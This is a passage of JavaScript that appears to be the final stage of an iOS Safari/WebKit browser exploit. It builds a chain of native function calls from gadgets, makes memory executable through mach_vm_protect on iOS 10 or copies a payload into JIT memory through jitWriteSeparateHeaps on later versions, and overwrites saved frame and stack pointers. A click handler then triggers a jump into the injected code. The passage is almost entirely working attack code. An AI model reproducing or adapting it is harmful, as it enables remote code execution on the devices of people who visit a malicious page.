            x3 = x3 || Int64.Zero
            jump_to = jump_to || stackloader

            return (ldrx8 ? add_call_via_x8 : add_call_llvm)(
                func, x0, x1, x2, x3, x4, jump_to
            )
        }

        if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent)) {
            add_call(mach_vm_protect
                , mach_task_self_    // task
                , codeAddr           // addr
                , shsz               // size
                , new Int64(0)       // set maximum
                , new Int64(7)       // prot (RWX)
            );

            add_call(memmove
                , codeAddr           // dst
                , paddr              // src
                , shsz               // size
            );
        } else {
            if (jitWriteSeparateHeaps.lo() || jitWriteSeparateHeaps.hi()) {
                add_call(jitWriteSeparateHeaps
                    , Sub(codeAddr, memPoolStart)     // off
                    , paddr                           // src
                    , shsz                            // size
                );
            } else {
                fail('bi0n1c (c)');
            }

            segs.forEach(function(seg) {
                if (seg.prots.hi() & 2) { // VM_PROT_WRITE
                    var addr = Add(seg.addr, codeAddr);
                    add_call(mach_vm_protect
                        , mach_task_self_    // task
                        , addr               // addr
                        , seg.size           // size
                        , new Int64(0)       // set maximum
                        , new Int64(0x13)    // prot (RW- | COPY)
                    );
                }
            })
        }

        add_call(usleep
            , new Int64(100000) // microseconds
        );

        add_call(jmpAddr);

        // dummy
        for(var i = 0; i < 0x20; ++i)
        {
            arr[pos++] = 0xde00c0de + (i<<16);
        }

        var sp = Add(stack, (arrsz - off) * 4);
        memory.writeInt64(Add(el_addr, 0x60), Add(sp, 0x60));      // x29
        memory.writeInt64(Add(el_addr, 0x68), sp);      // x2 (copied into sp)

        // trigger
        //print("u rdy?")
        wrapper.addEventListener("click", function(){});

        fail("should never reach this");
    }
})();
